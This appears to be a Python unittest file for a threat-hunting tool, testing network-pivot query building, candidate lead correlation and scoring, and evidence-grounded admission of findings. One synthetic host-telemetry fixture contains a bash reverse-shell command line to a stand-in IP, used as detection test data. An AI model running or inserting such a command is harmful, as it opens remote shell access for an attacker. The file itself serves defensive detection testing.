import unittest


class CandidateNetworkPivotTests(unittest.TestCase):
    def test_candidate_network_spec_uses_only_primary_ip_with_behavior(self):
        from romulus.investigation.search_planner import candidate_network_spec, compile_arkime, compile_tshark

        spec = candidate_network_spec(
            {
                "candidate_id": "CL-SCAN",
                "ips": ["10.40.5.9", "10.40.8.20", "not-an-ip"],
                "hostnames": ["ignored.example.test"],
            },
            {"ports": [], "protocols": ["tcp", "udp"]},
            require_entity=True,
        )

        self.assertEqual(spec["ips"], ["10.40.5.9"])
        self.assertEqual(spec["hostnames"], [])
        arkime = compile_arkime(spec)
        tshark, _ = compile_tshark(spec)
        for expression in (arkime, tshark):
            self.assertIn("10.40.5.9", expression)
            self.assertNotIn("10.40.8.20", expression)
            self.assertNotIn("ignored.example.test", expression)
        self.assertIn("protocols == tcp", arkime)
        self.assertIn("protocols == udp", arkime)
        self.assertIn("tcp", tshark)
        self.assertIn("udp", tshark)

    def test_candidate_network_spec_uses_safe_hostname_only_without_ip(self):
        from romulus.investigation.search_planner import candidate_network_spec, compile_arkime

        spec = candidate_network_spec(
            {
                "candidate_id": "CL-DNS",
                "ips": ["malformed-ip"],
                "hostnames": ["telemetry.example.test", "ignored.example.test"],
            },
            {"ports": [53], "protocols": ["dns"]},
            require_entity=True,
        )

        self.assertEqual(spec["ips"], [])
        self.assertEqual(spec["hostnames"], ["telemetry.example.test"])
        expression = compile_arkime(spec)
        self.assertIn("dns.host == *telemetry.example.test*", expression)
        self.assertNotIn("ignored.example.test", expression)
        self.assertIn("protocols == dns", expression)

    def test_candidate_network_spec_rejects_missing_safe_entity(self):
        from romulus.investigation.search_planner import candidate_network_spec

        with self.assertRaisesRegex(ValueError, "candidate network pivot requires"):
            candidate_network_spec(
                {"candidate_id": "CL-EMPTY", "ips": ["999.1.1.1"], "hostnames": ["bad host value"]},
                {"ports": [443], "protocols": ["tls"]},
                require_entity=True,
            )

    def test_candidate_network_pivot_rejects_entity_without_behavior(self):
        from romulus.investigation.search_planner import candidate_network_spec
        from romulus.investigation.workflow import _lead_catalog, _lead_network_expression

        lead = {
            "candidate_id": "CL-SHELL",
            "technique_id": "T1059.004",
            "ips": ["10.40.5.9"],
            "hostnames": [],
        }
        with self.assertRaisesRegex(ValueError, "behavior selector"):
            candidate_network_spec(lead, {}, require_entity=True)
        with self.assertRaisesRegex(ValueError, "behavior selector"):
            _lead_network_expression(lead)

        projected = _lead_catalog([{
            "hypothesis_id": "H-SHELL",
            "candidate_id": "CL-SHELL",
            "technique_id": "T1059.004",
            "title": "Observed shell behavior",
            "expected_host": ["Review the cited process lineage."],
            "expected_network": ["Review adjacent sessions."],
            "ips": ["10.40.5.9"],
            "hostnames": [],
            "basis_evidence_ids": ["EV-SHELL"],
        }])
        self.assertEqual([item["source"] for item in projected], ["host"])

    def test_workflow_candidate_helpers_include_primary_entity(self):
        from romulus.investigation.workflow import _lead_network_expression, _lead_pcap_filter

        lead = {
            "candidate_id": "CL-SCAN",
            "technique_id": "T1046",
            "ips": ["10.40.5.9", "10.40.8.20"],
            "hostnames": [],
        }

        arkime = _lead_network_expression(lead)
        tshark = _lead_pcap_filter(lead)
        self.assertIn("10.40.5.9", arkime)
        self.assertIn("10.40.5.9", tshark)
        self.assertNotIn("10.40.8.20", arkime)
        self.assertNotIn("10.40.8.20", tshark)
        self.assertIn("protocols == tcp", arkime)
        self.assertIn("protocols == udp", arkime)

    def test_non_candidate_coverage_lead_may_remain_behavior_only(self):
        from romulus.investigation.workflow import _lead_network_expression, _lead_pcap_filter

        arkime = _lead_network_expression({"technique_id": "T1046"})
        tshark = _lead_pcap_filter({"technique_id": "T1046"})

        self.assertEqual(arkime, "(protocols == tcp || protocols == udp)")
        self.assertEqual(tshark, "((tcp || udp))")


class CandidateRelationshipTests(unittest.TestCase):
    caveat = "Temporal or entity association is an investigative lead, not causation."

    @staticmethod
    def _candidate(identifier, group, evidence_id, score=50):
        return {
            "candidate_id": identifier,
            "kind": "behavior",
            "analytic_id": f"AN-{identifier}",
            "corroboration_group": group,
            "analytic_source": "aggregate",
            "priority_score": score,
            "priority_tier": "medium",
            "disposition": "observed",
            "customer_visible": False,
            "evidence_ids": [evidence_id],
            "assets": ["shared-label"],
            "score_reasons": ["base score"],
            "follow_ups": [],
            "finding_ids": [],
        }

    @staticmethod
    def _event(identifier, observed_at, ip, *, role="source"):
        return {
            "evidence_id": identifier,
            "source": "synthetic",
            "observed_at": observed_at,
            "asset": "shared-label",
            "raw": {role: {"ip": ip}},
        }

    def test_distinct_groups_share_typed_evidence_at_window_boundary(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate("CL-A", "GROUP-A", "EV-A", 50),
            self._candidate("CL-B", "GROUP-B", "EV-B", 60),
        ]
        evidence = [
            self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
            self._event("EV-B", "2026-06-01T12:30:00Z", "10.55.0.8", role="host"),
        ]

        related = relate_candidates(candidates, evidence)

        by_id = {item["candidate_id"]: item for item in related}
        self.assertEqual(by_id["CL-A"]["priority_score"], 60)
        self.assertEqual(by_id["CL-B"]["priority_score"], 70)
        self.assertEqual(
            by_id["CL-A"]["related_candidates"],
            [{
                "candidate_id": "CL-B",
                "shared_entity_type": "ip",
                "shared_entity": "10.55.0.8",
                "evidence_ids": ["EV-A", "EV-B"],
                "time_delta_seconds": 1800,
                "confidence": "moderate",
                "caveat": self.caveat,
            }],
        )
        self.assertEqual(by_id["CL-B"]["related_candidates"][0]["candidate_id"], "CL-A")
        self.assertIn("GROUP-B", " ".join(by_id["CL-A"]["corroboration_reasons"]))
        self.assertTrue(by_id["CL-B"]["customer_visible"])
        self.assertEqual(by_id["CL-B"]["disposition"], "corroborated")

    def test_relationship_is_input_order_stable(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate("CL-A", "GROUP-A", "EV-A", 50),
            self._candidate("CL-B", "GROUP-B", "EV-B", 60),
        ]
        evidence = [
            self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
            self._event("EV-B", "2026-06-01T12:10:00Z", "10.55.0.8", role="destination"),
        ]

        self.assertEqual(
            relate_candidates(candidates, evidence),
            relate_candidates(list(reversed(candidates)), list(reversed(evidence))),
        )

    def test_just_outside_window_does_not_relate(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate("CL-A", "GROUP-A", "EV-A"),
            self._candidate("CL-B", "GROUP-B", "EV-B"),
        ]
        evidence = [
            self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
            self._event("EV-B", "2026-06-01T12:30:01Z", "10.55.0.8"),
        ]

        related = relate_candidates(candidates, evidence)

        self.assertTrue(all(item["related_candidates"] == [] for item in related))
        self.assertEqual({item["priority_score"] for item in related}, {50})

    def test_same_group_missing_time_and_asset_only_overlap_do_not_relate(self):
        from romulus.investigation.candidate_triage import relate_candidates

        cases = [
            (
                [self._candidate("CL-A", "SAME", "EV-A"), self._candidate("CL-B", "SAME", "EV-B")],
                [self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
                 self._event("EV-B", "2026-06-01T12:05:00Z", "10.55.0.8")],
            ),
            (
                [self._candidate("CL-A", "GROUP-A", "EV-A"), self._candidate("CL-B", "GROUP-B", "EV-B")],
                [self._event("EV-A", "", "10.55.0.8"),
                 self._event("EV-B", "2026-06-01T12:05:00Z", "10.55.0.8")],
            ),
            (
                [self._candidate("CL-A", "GROUP-A", "EV-A"), self._candidate("CL-B", "GROUP-B", "EV-B")],
                [self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
                 self._event("EV-B", "2026-06-01T12:05:00Z", "10.55.0.9")],
            ),
        ]

        for candidates, evidence in cases:
            with self.subTest(case=candidates[0]["corroboration_group"]):
                related = relate_candidates(candidates, evidence)
                self.assertTrue(all(item["related_candidates"] == [] for item in related))
                self.assertTrue(all(item["priority_score"] == 50 for item in related))

    def test_bonus_is_capped_and_recalculation_is_idempotent(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate(f"CL-{suffix}", f"GROUP-{suffix}", f"EV-{suffix}", 40)
            for suffix in ("A", "B", "C", "D")
        ]
        evidence = [
            self._event(f"EV-{suffix}", f"2026-06-01T12:0{index}:00Z", "10.55.0.8")
            for index, suffix in enumerate(("A", "B", "C", "D"))
        ]

        related = relate_candidates(candidates, evidence)
        recalculated = relate_candidates(related, evidence)

        self.assertTrue(all(item["corroboration_bonus"] == 20 for item in related))
        self.assertTrue(all(item["priority_score"] == 60 for item in related))
        self.assertEqual(recalculated, related)

    def test_capped_relationship_score_returns_to_uncapped_base_when_relation_disappears(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate("CL-A", "GROUP-A", "EV-A", 96),
            self._candidate("CL-B", "GROUP-B", "EV-B", 50),
            self._candidate("CL-C", "GROUP-C", "EV-C", 50),
        ]
        evidence = [
            self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
            self._event("EV-B", "2026-06-01T12:01:00Z", "10.55.0.8"),
            self._event("EV-C", "2026-06-01T12:02:00Z", "10.55.0.8"),
        ]

        related = relate_candidates(candidates, evidence)
        promoted = next(item for item in related if item["candidate_id"] == "CL-A")
        self.assertEqual(promoted["base_priority_score"], 96)
        self.assertEqual(promoted["corroboration_bonus"], 20)
        self.assertEqual(promoted["priority_score"], 100)

        recalculated = relate_candidates(related, evidence[:1])
        restored = next(item for item in recalculated if item["candidate_id"] == "CL-A")
        self.assertEqual(restored["base_priority_score"], 96)
        self.assertEqual(restored["priority_score"], 96)
        self.assertEqual(restored["priority_tier"], "critical")
        self.assertEqual(restored["corroboration_bonus"], 0)
        self.assertEqual(restored["disposition"], "observed")

    def test_partial_relationship_loss_recomputes_visibility_and_disposition(self):
        from romulus.investigation.candidate_triage import relate_candidates

        candidates = [
            self._candidate("CL-A", "GROUP-A", "EV-A", 50),
            self._candidate("CL-B", "GROUP-B", "EV-B", 50),
            self._candidate("CL-C", "GROUP-C", "EV-C", 50),
        ]
        evidence = [
            self._event("EV-A", "2026-06-01T12:00:00Z", "10.55.0.8"),
            self._event("EV-B", "2026-06-01T12:01:00Z", "10.55.0.8"),
            self._event("EV-C", "2026-06-01T12:02:00Z", "10.55.0.8"),
        ]

        related = relate_candidates(candidates, evidence)
        promoted = next(item for item in related if item["candidate_id"] == "CL-A")
        self.assertEqual(promoted["priority_score"], 70)
        self.assertEqual(promoted["disposition"], "corroborated")
        self.assertTrue(promoted["customer_visible"])

        recalculated = relate_candidates(related, evidence[:2])
        demoted = next(item for item in recalculated if item["candidate_id"] == "CL-A")
        self.assertEqual(demoted["corroboration_bonus"], 10)
        self.assertEqual(demoted["priority_score"], 60)
        self.assertEqual(demoted["disposition"], "observed")
        self.assertFalse(demoted["customer_visible"])


class CandidateFrontierTests(unittest.TestCase):
    @staticmethod
    def _candidate(identifier, group, score, *, kind="behavior"):
        return {
            "candidate_id": identifier,
            "kind": kind,
            "indicator_id": identifier if kind == "trusted_indicator" else None,
            "analytic_id": f"AN-{group}",
            "corroboration_group": group,
            "priority_score": score,
            "priority_tier": "critical" if score >= 90 else ("high" if score >= 70 else ("medium" if score >= 40 else "low")),
            "disposition": "observed",
            "customer_visible": kind == "trusted_indicator",
            "evidence_ids": [f"EV-{identifier}"],
            "assets": [f"host-{identifier.lower()}"],
            "attack_techniques": ["T1046"],
            "benign_explanations": ["Authorized testing"],
            "follow_ups": [],
            "finding_ids": [],
            "title": f"Candidate {identifier}",
            "description": "Synthetic evidence-backed behavior.",
        }

    def test_repetitive_high_scores_do_not_crowd_distinct_groups(self):
        from romulus.investigation.candidate_triage import select_candidate_frontier

        scans = [self._candidate(f"CL-SCAN-{index}", "scan", 98 - index) for index in range(8)]
        distinct = [
            self._candidate("CL-DNS", "dns", 72),
            self._candidate("CL-AUTH", "auth", 68),
            self._candidate("CL-EXEC", "execution", 64),
        ]

        selected = select_candidate_frontier(scans + distinct)
        groups = [item["corroboration_group"] for item in selected]

        self.assertLessEqual(groups.count("scan"), 2)
        self.assertTrue({"dns", "auth", "execution"}.issubset(groups))

    def test_two_strongest_subthreshold_candidates_use_exploration_reserve(self):
        from romulus.investigation.candidate_triage import select_candidate_frontier

        primary = [self._candidate(f"CL-HIGH-{index}", f"high-{index}", 80 - index) for index in range(6)]
        exploratory = [
            self._candidate("CL-LOW-A", "low-a", 39),
            self._candidate("CL-LOW-B", "low-b", 35),
            self._candidate("CL-LOW-C", "low-c", 30),
        ]

        selected = select_candidate_frontier(primary + exploratory)
        selected_ids = [item["candidate_id"] for item in selected]

        self.assertEqual(len(selected), 8)
        self.assertIn("CL-LOW-A", selected_ids)
        self.assertIn("CL-LOW-B", selected_ids)
        self.assertNotIn("CL-LOW-C", selected_ids)

    def test_trusted_critical_then_preferred_candidates_precede_ordinary(self):
        from romulus.investigation.candidate_triage import select_candidate_frontier

        candidates = [
            self._candidate("CL-ORDINARY", "ordinary", 85),
            self._candidate("CL-PREFERRED", "preferred", 55),
            self._candidate("CL-CRITICAL", "critical", 92),
            self._candidate("CL-TRUSTED", "trusted", 95, kind="trusted_indicator"),
        ]

        selected = select_candidate_frontier(candidates, preferred_ids={"CL-PREFERRED"})
        selected_ids = [item["candidate_id"] for item in selected]

        self.assertEqual(set(selected_ids[:2]), {"CL-TRUSTED", "CL-CRITICAL"})
        self.assertLess(selected_ids.index("CL-PREFERRED"), selected_ids.index("CL-ORDINARY"))

    def test_all_unresolved_preferred_candidates_survive_the_exploration_reserve(self):
        from romulus.investigation.candidate_triage import select_candidate_frontier

        preferred = [
            self._candidate(f"CL-PREFERRED-{index}", f"preferred-{index}", 20 - index)
            for index in range(4)
        ]
        ordinary = [
            self._candidate(f"CL-ORDINARY-{index}", f"ordinary-{index}", 80 - index)
            for index in range(8)
        ]

        selected = select_candidate_frontier(
            ordinary + preferred,
            preferred_ids={item["candidate_id"] for item in preferred},
        )
        selected_ids = {item["candidate_id"] for item in selected}

        self.assertTrue({item["candidate_id"] for item in preferred}.issubset(selected_ids))

    def test_exploration_never_displaces_critical_candidates(self):
        from romulus.investigation.candidate_triage import select_candidate_frontier

        critical = [
            self._candidate(f"CL-CRITICAL-{index}", f"critical-{index}", 99 - index)
            for index in range(8)
        ]
        exploratory = [self._candidate("CL-LOW-A", "low-a", 39), self._candidate("CL-LOW-B", "low-b", 38)]

        selected = select_candidate_frontier(critical + exploratory)

        self.assertEqual(
            {item["candidate_id"] for item in selected},
            {item["candidate_id"] for item in critical},
        )

    def test_represented_candidates_leave_excluded_candidates_for_later_pass(self):
        from romulus.investigation.workflow import _candidate_hypotheses

        candidates = [self._candidate(f"CL-SCAN-{index}", "scan", 90 - index) for index in range(5)]
        candidates.extend(self._candidate(f"CL-GROUP-{index}", f"group-{index}", 70 - index) for index in range(3))

        first = _candidate_hypotheses(candidates, [])
        second = _candidate_hypotheses(candidates, first)
        third = _candidate_hypotheses(candidates, first + second)
        first_ids = {item["candidate_id"] for item in first}
        second_ids = {item["candidate_id"] for item in second}
        third_ids = {item["candidate_id"] for item in third}

        self.assertTrue(first_ids)
        self.assertTrue(second_ids)
        self.assertTrue(first_ids.isdisjoint(second_ids))
        self.assertTrue((first_ids | second_ids).isdisjoint(third_ids))
        self.assertEqual(first_ids | second_ids | third_ids, {item["candidate_id"] for item in candidates})

    def test_stale_high_scores_cannot_starve_a_current_lower_score_candidate(self):
        from romulus.investigation.workflow import _candidate_hypotheses

        stale = [
            self._candidate(f"CL-STALE-{index}", f"stale-{index}", 99 - index)
            for index in range(9)
        ]
        valid = self._candidate("CL-CURRENT", "current", 20)
        hypotheses = _candidate_hypotheses(
            stale + [valid],
            [],
            evidence=[{"evidence_id": "EV-CL-CURRENT", "asset": "host-current"}],
        )

        self.assertEqual([item["candidate_id"] for item in hypotheses], ["CL-CURRENT"])


class AttackDiscoveryWorkflowTests(unittest.TestCase):
    def test_generic_multi_behavior_fixture_reaches_diverse_entity_scoped_frontier(self):
        import tempfile
        import time
        from dataclasses import replace
        from pathlib import Path

        from romulus.config import Settings
        from romulus.investigation.casefile import build_case_file
        from romulus.investigation.reasoning import admit_reasoning
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        network = []
        for scanner_index in range(8):
            source = f"10.80.0.{scanner_index + 10}"
            for target_index in range(4):
                network.append({
                    "evidence_id": f"EV-SCAN-{scanner_index}-{target_index}",
                    "source": "arkime",
                    "observed_at": f"2026-09-02T10:{scanner_index:02d}:{target_index:02d}Z",
                    "asset": source,
                    "observation": "Synthetic connection observation",
                    "raw": {
                        "source": {"ip": source},
                        "destination": {"ip": f"198.51.100.{target_index + 10}", "port": 8000 + target_index},
                        "network": {"protocol": "tcp"},
                    },
                })
        network.append({
            "evidence_id": "EV-DNS-BEHAVIOR",
            "source": "arkime",
            "observed_at": "2026-09-02T10:20:00Z",
            "asset": "10.90.0.27",
            "observation": "Synthetic DNS observation",
            "raw": {
                "source": {"ip": "10.90.0.27"},
                "destination": {"ip": "203.0.113.53", "port": 53},
                "network": {"protocol": "dns"},
                "dns": {"question": {"name": "abcdefghijklmnopqrstuvwxyz012345.example.test"}},
            },
        })
        host = [{
            "evidence_id": "EV-EXEC-BEHAVIOR",
            "source": "elasticsearch",
            "observed_at": "2026-09-02T10:15:00Z",
            "asset": "node-27.example.test",
            "observation": "Synthetic process observation",
            "raw": {
                "host": {"name": "node-27.example.test", "ip": "10.90.0.27"},
                "process": {"command_line": "bash -i >& /dev/tcp/192.0.2.44/9443 0>&1"},
            },
        }]

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
                arkime_url="http://arkime.example.test:8005",
                arkime_username="test-user",
                arkime_password="test-password",
                pcap_files=(),
                historical_search=True,
            )
            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=False, use_ollama=False)
            state = {
                "hunt_id": "HUNT-GENERIC-DISCOVERY",
                "objective": "Hunt broadly for evidence-backed suspicious behavior.",
                "mission_mode": "undirected",
                "host": host,
                "network": network,
                "evidence": [],
                "findings": [],
                "hypotheses": [],
                "candidate_leads": [],
                "lead_catalog": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "coverage": {},
                "source_health": {"host": True, "network": True},
                "reasoning_history": [],
                "stage_history": [],
                "tool_runs": [],
                "source_errors": [],
                "tool_calls": 0,
                "started_epoch": time.time(),
            }

            result = engine._analyze(state)

        candidates_by_analytic = {
            item.get("analytic_id"): item for item in result["candidate_leads"] if item.get("analytic_id")
        }
        represented = {
            candidate_id for hypothesis in result["hypotheses"]
            for candidate_id in hypothesis.get("basis_candidate_ids", [])
        }
        dns_candidate = candidates_by_analytic["BH-NET-004"]
        execution_candidate = candidates_by_analytic["BH-LNX-016"]
        scan_candidates = [
            item for item in result["candidate_leads"] if item.get("analytic_id") == "BH-NET-001"
        ]

        self.assertTrue(result["hypotheses"])
        self.assertTrue(all(hypothesis.get("basis_candidate_ids") for hypothesis in result["hypotheses"]))
        self.assertIn(dns_candidate["candidate_id"], represented)
        self.assertLessEqual(sum(item["candidate_id"] in represented for item in scan_candidates), 2)
        self.assertTrue(any(
            relation["candidate_id"] == execution_candidate["candidate_id"]
            and relation["evidence_ids"] == ["EV-DNS-BEHAVIOR", "EV-EXEC-BEHAVIOR"]
            for relation in dns_candidate["related_candidates"]
        ))

        represented_scan = next(item for item in scan_candidates if item["candidate_id"] in represented)
        scan_task = next(
            task for task in result["search_tasks"].values()
            if represented_scan["candidate_id"] in task.get("candidate_ids", [])
            and task.get("source") == "arkime"
        )
        expression = scan_task["query_spec"]["expression"]
        self.assertIn(represented_scan["assets"][0], expression)
        self.assertIn("protocols == tcp", expression)
        self.assertIn("protocols == udp", expression)
        self.assertEqual(result["findings"], [])

        bounded_case = build_case_file(result, candidate_limit=8, evidence_limit=8)
        self.assertTrue(bounded_case["candidates"])
        self.assertTrue(all(item["evidence_ids"] for item in bounded_case["candidates"]))
        self.assertLessEqual(len(bounded_case["evidence"]), 8)
        hidden_owner = next(
            item for item in bounded_case["candidates"]
            if item["evidence_total"] > len(item["evidence_ids"])
        )
        raw_owner = next(
            item for item in result["candidate_leads"]
            if item["candidate_id"] == hidden_owner["candidate_id"]
        )
        hidden_evidence_id = next(
            item for item in raw_owner["evidence_ids"]
            if item not in hidden_owner["evidence_ids"]
        )
        hidden_hypothesis = next(
            item for item in bounded_case["hypotheses"]
            if item["candidate_id"] == hidden_owner["candidate_id"]
        )
        hidden_finding = {
            "proposal_id": "P-HIDDEN-FINDING",
            "hypothesis_id": hidden_hypothesis["hypothesis_id"],
            "title": "Hidden citation attempt",
            "technique_id": hidden_hypothesis["technique_id"],
            "observation": "The proposal cites telemetry outside the bounded case file.",
            "interpretation": "The proposal must remain inadmissible.",
            "evidence_ids": [hidden_owner["evidence_ids"][0], hidden_evidence_id],
            "confidence": "moderate",
            "confidence_justification": "Two claimed citations.",
            "alternatives": ["Expected administration"],
            "follow_up": ["Review visible evidence only."],
        }
        hidden_admission = admit_reasoning(
            bounded_case,
            {"assessments": [], "new_hypotheses": [], "searches": [],
             "findings": [hidden_finding], "summary": "bounded test"},
            {"reviews": [{"proposal_id": "P-HIDDEN-FINDING", "decision": "accept",
                "issue_codes": [], "rationale": "claimed grounding"}]},
            result["hypotheses"],
        )
        self.assertEqual(hidden_admission["findings"], [])
        self.assertTrue(any(
            "unknown_evidence" in item.get("reason_codes", [])
            for item in hidden_admission["rejections"]
        ))

        relationship_case = build_case_file(result, candidate_limit=8, evidence_limit=24)
        related_owner = next(item for item in relationship_case["candidates"] if item["related_candidates"])
        relationship = related_owner["related_candidates"][0]
        relationship_hypothesis = next(
            item for item in relationship_case["hypotheses"]
            if item["candidate_id"] == related_owner["candidate_id"]
        )
        relationship_finding = {
            "proposal_id": "P-RELATIONSHIP-FINDING",
            "hypothesis_id": relationship_hypothesis["hypothesis_id"],
            "title": "Relationship-only attempt",
            "technique_id": relationship_hypothesis["technique_id"],
            "observation": "Two related records are visible.",
            "interpretation": "Temporal association alone is not a confirmed finding.",
            "evidence_ids": relationship["evidence_ids"],
            "confidence": "moderate",
            "confidence_justification": "A relationship was observed.",
            "alternatives": ["Independent expected activity"],
            "follow_up": ["Seek discriminating evidence."],
        }
        relationship_admission = admit_reasoning(
            relationship_case,
            {"assessments": [], "new_hypotheses": [], "searches": [],
             "findings": [relationship_finding], "summary": "relationship test"},
            {"reviews": [{"proposal_id": "P-RELATIONSHIP-FINDING", "decision": "accept",
                "issue_codes": [], "rationale": "claimed grounding"}]},
            result["hypotheses"],
        )
        self.assertEqual(relationship_admission["findings"], [])
        self.assertTrue(any(
            "unsupported_hypothesis" in item.get("reason_codes", [])
            for item in relationship_admission["rejections"]
        ))


if __name__ == "__main__":
    unittest.main()
